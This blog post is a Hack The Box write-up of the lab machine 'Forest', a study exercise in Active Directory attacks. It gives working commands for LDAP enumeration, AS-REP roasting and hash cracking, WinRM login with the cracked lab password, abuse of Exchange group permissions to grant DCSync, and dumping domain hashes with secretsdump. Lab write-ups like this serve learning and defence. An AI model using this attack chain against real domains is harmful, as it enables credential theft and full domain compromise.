+++
title = "Hack The Box: Forest"
date = "2022-02-25"
author = ""
authorTwitter = ""
cover = ""
tags = ["Learning AD", "HTB", "LDAP", "AS-REP Roasting", "BloodHound"]
keywords = ["", ""]
description = ""
showFullContent = false
toc = true
+++

<!--more-->
{{< image src="/img/forest/logo.png" alt="" position="center" style="border-radius: 8px;" >}}

## Introduction

After passing my OSCP, I am planning on doing CRTP and CRTO sometime this year. I took the OSCP exam before the updates that are focused on Active
Directory so I didn't actively focus on this area. 

So to learn and practice on AD and Windows and also as some prep for the certifications I plan on taking, I will be doing some machines that are AD 
related and try to get into the details of the included misconfigurations and vulnerabilities. 

For this writeup I am looking at Forest from HTB. There are many writeups on this so I will use them as references for learning.

## Enumeration

Open ports as found by nmap.

```sh
Nmap scan report for 10.10.10.161
Host is up (0.20s latency).

PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2022-02-25 16:32:33Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49684/tcp open  msrpc        Microsoft Windows RPC
49703/tcp open  msrpc        Microsoft Windows RPC
49945/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2022-02-25T16:33:28
|_  start_date: 2022-02-25T16:25:55
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
|_clock-skew: mean: 2h52m14s, deviation: 4h37m09s, median: 12m13s
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2022-02-25T08:33:27-08:00
```

From the results we see some notable ports (88,389) that point to us that this is a domain controller. From ldap we see the domain is **htb.local** and 
from smb the computer name is **FOREST**.

### LDAP Null bind

LDAP null bind is allowed on this machine allowing us to make ldap queries without authentication. Something to note this is not a default configuration
for Windows AD, you have to set this up manually.

By running nmap ldap scripts against the machine alot of the ldap information is dumped. I have cut most off the output.

```sh
Nmap scan report for 10.10.10.161
Host is up (0.20s latency).

PORT    STATE SERVICE    VERSION
389/tcp open  ldap       Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
| ldap-search:
|   Context: DC=htb,DC=local
|     dn: DC=htb,DC=local
|         objectClass: top
|         objectClass: domain
|         objectClass: domainDNS
|         distinguishedName: DC=htb,DC=local
|         instanceType: 5
|         whenCreated: 2019/09/18 17:45:49 UTC
|         whenChanged: 2022/02/25 16:25:45 UTC
|         subRefs: DC=ForestDnsZones,DC=htb,DC=local
|         subRefs: DC=DomainDnsZones,DC=htb,DC=local
|         subRefs: CN=Configuration,DC=htb,DC=local

--- snip ---
```

We can also confirm this using ldapsearch and we see all ldap information.

```sh
ldapsearch -h 10.10.10.161 -x -b "DC=htb,DC=local" 
```

{{< image src="/img/forest/forest1.png" alt="" position="center" style="border-radius: 8px;" >}}

Since the output is quite verbose and not easy to digest I'll use **windapsearch** which is a nicer tool that helps with ldap information.

#### Users

```sh
windapsearch -d htb.local --dc 10.10.10.161 -m users --attrs samaccountname | grep -i samaccountname | awk '{print $2}'
```

```
SM_ca8c2ed5bdab4dc9b
SM_75a538d3025e4db9a
$331000-VK4ADACQNUCA
SM_2c8eef0a09b545acb
Guest
DefaultAccount
SM_681f53d4942840e18
SM_1ffab36a2f5f479cb
HealthMailboxc3d7722
SM_9b69f1b9d2cc45549
SM_7c96b981967141ebb
SM_c75ee099d0a64c91b
SM_1b41c9286325456bb
HealthMailboxfc9daad
HealthMailboxc0a90c9
HealthMailbox670628e
HealthMailbox968e74d
HealthMailbox6ded678
HealthMailboxb01ac64
HealthMailbox7108a4e
HealthMailbox0659cc1
HealthMailbox83d6781
mark
lucinda
santi
andy
HealthMailboxfd87238
sebastien
```

#### Computers

```sh
windapsearch -d htb.local --dc 10.10.10.161 -m computers
```

```
dn: CN=FOREST,OU=Domain Controllers,DC=htb,DC=local
cn: FOREST
operatingSystem: Windows Server 2016 Standard
operatingSystemVersion: 10.0 (14393)
dNSHostName: FOREST.htb.local

dn: CN=EXCH01,CN=Computers,DC=htb,DC=local
cn: EXCH01
operatingSystem: Windows Server 2016 Standard
operatingSystemVersion: 10.0 (14393)
dNSHostName: EXCH01.htb.local
```
#### Groups

```sh
windapsearch -d htb.local --dc 10.10.10.161 -m groups | grep cn | awk -F\: '{print $2}'  
```

```
--- snip ---
Key Admins
Enterprise Key Admins
Organization Management
Recipient Management
UM Management
Help Desk
Discovery Management
Records Management
Public Folder Management
Server Management
View-Only Organization Management
Delegated Setup
Security Reader
Hygiene Management
Security Administrator
Compliance Management
Exchange Servers
Exchange Trusted Subsystem
Managed Availability Servers
Exchange Windows Permissions
ExchangeLegacyInterop
Exchange Install Domain Servers
test
```

We can go on and on with enumeration but you get the point. From the user accounts list and computers we can see presence of an
Exchange server in the domain, keep this in mind it will be important later.

At this point we don't yet have any actionable information that could help us get a foothold.

## AS-REP Roasting

This attack has been well covered on other posts online, I'll list ones that I like as references.

We'll use GetNPUsers script from impacket to perform the attack. This script also makes ldap queries to identify users vulnerable to
the attack.

```sh
GetNPUsers.py -request -dc-ip 10.10.10.161 htb.local/
```

{{< image src="/img/forest/forest2.png" alt="" position="center" style="border-radius: 8px;" >}}

Using the output, I was able to crack the hash with john and get the user's password.

```sh
john --wordlist=/usr/share/wordlists/rockyou.txt svc-alfresco.txt
```

**svc-alfresco : s3rvice**

## Shell as svc-alfresco

With the discovered credentials we can get a shell, to confirm that we can use this user to get a shell I will use crackmapexec.

{{< image src="/img/forest/forest3.png" alt="" position="center" style="border-radius: 8px;" >}}

CME confirms we can connect via winrm.

```sh
evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
```
Once we have a shell we can look at group memberships for this account.

{{< image src="/img/forest/forest4.png" alt="" position="center" style="border-radius: 8px;" >}}

From the output we see we are part of several interesting non-default groups.

1. Remote Management Users - Builtin 
2. Account Operators - Builtin
3. Privileged IT Accounts - Custom
4. Service Accounts - Custom

We know the Remote Management Users group is the one that allowed us winrm access.

### Domain Enumeration with Bloodhound

Since this is a domain controller we can try to find the privilege escalation path using domain information. This is
where bloodhound will come in handy. If you haven't use bloodhound against your AD environment, you should!

>BloodHound uses graph theory to reveal the hidden and often unintended relationships within an Active Directory or Azure environment. 
>Attackers can use BloodHound to easily identify highly complex attack paths that would otherwise be impossible to quickly identify. 
>
>Source - BloodHound Github page

I recommend you use [release 4.0.3](https://github.com/BloodHoundAD/BloodHound/releases/tag/4.0.3). For some reason the latest release 4.1.0 (at the time
of writing) didn't work well for me.

All you need to do is upload SharpHound.exe to the Forest machine, execute it, download the created zip file and upload it to Bloodhound.

Once uploaded, search for our user svc-alfresco and mark them as owned.

{{< image src="/img/forest/forest6.png" alt="" position="center" style="border-radius: 8px;" >}}

From there we can try uncover an possible attack path that will lead us to DA. The Pre-Built queries from BloodHound are quite useful. In our case the
**"Shortest Paths to Domain Admins from Owned Principals"** will give us a useful path.

{{< image src="/img/forest/forest7.png" alt="" position="center" style="border-radius: 8px;" >}}

We will get the below graph showing the path to Domain Admin, I have rearranged the nodes for easier view.

{{< image src="/img/forest/forest5.png" alt="" position="center" style="border-radius: 8px;" >}}

We see the **Account Operators** group has *GenericAll* permissions on **Exchange Windows Permissions** Group.

### Account Operators Group

By looking at [Microsoft documentation](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#account-operators);

> The Account Operators group grants limited account creation privileges to a user. Members of this group can create and modify most types of accounts, including those of users, 
local groups, and global groups, and members can log in locally to domain controllers.
>
> Members of the Account Operators group cannot manage the Administrator user account, the user accounts of administrators, or the Administrators, Server Operators, Account Operators, 
Backup Operators, or Print Operators groups. Members of this group cannot modify user rights.

From the above information, we see that the Account Operators group has permission to create and modify any groups except those listed. Since the Exchange Windows Permissions group
isn't part of this list, it becomes modifiable by default.

### Exchange Windows Permissions Group

Remember the presence of Exchange? When installing Exchange, by default the permissions granted on the domain are too high (I think this is now patched on 2019 version, not sure). When Exchange
is installed, the Exchange Windows Permissions Group has WriteDACL access to the Domain.

See this article that goes in depth on the subject. [https://adsecurity.org/?p=4119](https://adsecurity.org/?p=4119) 

The Exchange Trusted Subsystem Group can also be used as it is a member of the Exchange Windows Permissions Group.

Now we can chain these two issues to compromise the domain.

## Owning the Domain

First we'll use our Account Operator privileges as svc-alfresco to create an account and add it the Exchange Windows Permissions Group.

```sh
net user pwned 'Pwn3d!!' /add
net group "Exchange Windows Permissions" pwned /add
```

We can then upload PowerView and use it to grant DCSync privileges to the newly created account. 

The below commands will allow powerview to use the credentials of the new account to grant the privileges on that account. 
We could also use the svc-alfresco account if we wanted.

```sh
$SecPassword = ConvertTo-SecureString 'Pwn3d!!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\pwned', $SecPassword)
Add-DomainObjectAcl -Credential $Cred -TargetDomain htb.local -PrincipalIdentity 'pwned' -Rights DCSync
```

With that being successful, we can perform DCSync with secretsdump impacket script and get the administrator hash.

```sh
secretsdump.py htb.local/pwned:'Pwn3d!!'@10.10.10.161
```

{{< image src="/img/forest/forest9.png" alt="" position="center" style="border-radius: 8px;" >}}

We can then use the admin hash to get a shell.

## Extras

Todo - LDAP queries

## References

**AS-REP Roasting**

https://www.securitynik.com/2022/01/beginning-as-rep-roasting-with-impacket.html

https://jsecurity101.medium.com/ioc-differences-between-kerberoasting-and-as-rep-roasting-4ae179cdf9ec

https://blog.xpnsec.com/kerberos-attacks-part-2/

**Exchange and ACL Stuff**

https://www.blackhat.com/docs/us-17/wednesday/us-17-Robbins-An-ACE-Up-The-Sleeve-Designing-Active-Directory-DACL-Backdoors-wp.pdf

https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/

https://support.microsoft.com/en-us/topic/reducing-permissions-required-to-run-exchange-server-when-you-use-the-shared-permissions-model-e1972d47-d714-fd76-1fd5-7cdcb85408ed

https://pentestlab.blog/2019/09/12/microsoft-exchange-acl/

https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/

https://github.com/gdedrouas/Exchange-AD-Privesc/blob/master/DomainObject/DomainObject.md

**Other Forest Walkthroughs**

https://0xdf.gitlab.io/2020/03/21/htb-forest.html

https://www.youtube.com/watch?v=H9FcE_FMZio&t=3755s

https://vulndev.io/2020/03/21/forest-hackthebox/
